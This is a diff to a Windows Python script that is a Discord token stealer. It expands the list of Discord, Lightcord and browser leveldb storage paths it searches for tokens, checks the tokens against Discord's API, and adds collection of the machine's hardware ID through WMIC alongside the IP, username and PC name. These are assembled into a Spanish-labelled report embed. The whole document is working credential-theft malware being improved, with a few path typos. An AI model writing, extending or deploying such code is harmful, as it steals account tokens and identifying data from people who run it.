@@ -1,10 +1,11 @@
 import os
+import subprocess
 if os.name != "nt":
     exit()
 from re import findall
 from json import loads, dumps
 from base64 import b64decode
-from subprocess import Popen, PIPE
+#from subprocess import Popen, PIPE
 from urllib.request import Request, urlopen
 from datetime import datetime
 from threading import Thread
@@ -13,13 +14,25 @@ from sys import argv
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
-    "Discord"           : ROAMING + "\\Discord",
-    "Discord Canary"    : ROAMING + "\\discordcanary",
-    "Discord PTB"       : ROAMING + "\\discordptb",
-    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Discord"           : ROAMING + "\\discord\\Local Storage\\leveldb\\",
+    "Discord Canary"    : ROAMING + "\\discordcanary\\Local Storage\\leveldb\\",
+    "Discord PTB"       : ROAMING + "\\Lightcord\\Local Storage\\leveldb\\",
+
+    "Google SxS"        : LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Google 1"          : LOCAL + "\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
+    "Google 2"          : LOCAL + "\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
+    "Google 3"          : LOCAL + "\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\",
+    "Google 4"          : LOCAL + "\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\",
+    "Google 5"          : LOCAL + "\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\",
+
+    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
+    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
+    "Vivaldi"           : LOCAL + "\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
+    "Microsoft Edge"    : LOCAL + "\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\",
+
     "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
-    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
+    "Opera GX"          : ROAMING + "\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\"
 }
 def getheaders(token=None, content_type="application/json"):
     headers = {
@@ -33,9 +46,8 @@ def getuserdata(token):
     try:
         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
     except:
-        pass
+        pass            
 def gettokens(path):
-    path += "\\Local Storage\\leveldb"
     tokens = []
     for file_name in os.listdir(path):
         if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
@@ -110,6 +122,7 @@ def main():
     ip = getip()
     pc_username = os.getenv("UserName")
     pc_name = os.getenv("COMPUTERNAME")
+    pc_hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
     user_path_name = os.getenv("userprofile").split("\\")[2]
     developer = getdeveloper()
     for platform, path in PATHS.items():
@@ -150,7 +163,7 @@ def main():
                     },
                     {
                         "name": "**INFORMACION DEL PC**",
-                        "value": f'IP: {ip}\nUsuario: {pc_username}\nNombre del PC: {pc_name}\nLocalización del TOKEN: {platform}',
+                        "value": f'IP: {ip}\nUsuario: {pc_username}\nNombre del PC: {pc_name}\nHWID del PC: {pc_hwid}\nLocalización del TOKEN: {platform}',
                         "inline": True
                     },
                     {
